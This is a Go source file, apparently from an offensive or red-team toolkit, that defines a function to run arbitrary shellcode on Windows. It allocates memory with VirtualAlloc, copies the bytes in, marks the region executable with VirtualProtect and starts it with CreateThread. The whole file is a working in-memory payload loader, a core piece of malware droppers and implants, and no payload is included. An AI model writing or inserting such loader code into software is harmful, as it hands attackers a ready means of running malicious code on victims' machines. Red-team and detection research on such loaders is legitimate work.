package runshellthread

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	// Memory allocation constants
	MEM_COMMIT        = 0x1000
	MEM_RESERVE       = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE    = 0x04

)

// ExecuteShellcode allocates memory for the shellcode and executes it in a new thread.
// It returns the handle to the created thread, allowing the caller to wait for its completion.
func ExecuteShellcode(shellcode []byte, isLastPayload bool) (syscall.Handle, error) {

	
	addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return syscall.Handle(0), fmt.Errorf("VirtualAlloc failed: %v", err)
	}



	// Copy shellcode into memory
	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)


	// Change memory protection to execute-read
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return syscall.Handle(0), fmt.Errorf("VirtualProtect failed: %v", err)
	}


	// Start execution via CreateThread 
	var threadID uint32
	threadHandle, _, errNo := syscall.Syscall6(syscall.NewLazyDLL("kernel32.dll").NewProc("CreateThread").Addr(),
		6,
		0,                                  // lpThreadAttributes
		0,                                  // dwStackSize
		addr,                               // lpStartAddress
		0,                                  // lpParameter
		0,                                  // dwCreationFlags - Start immediately
		uintptr(unsafe.Pointer(&threadID))) // lpThreadId

	if threadHandle == 0 {
		return 0, fmt.Errorf("CreateThread failed with error: %v", errNo)
	}



	return syscall.Handle(threadHandle), nil // Return the actual thread handle
}
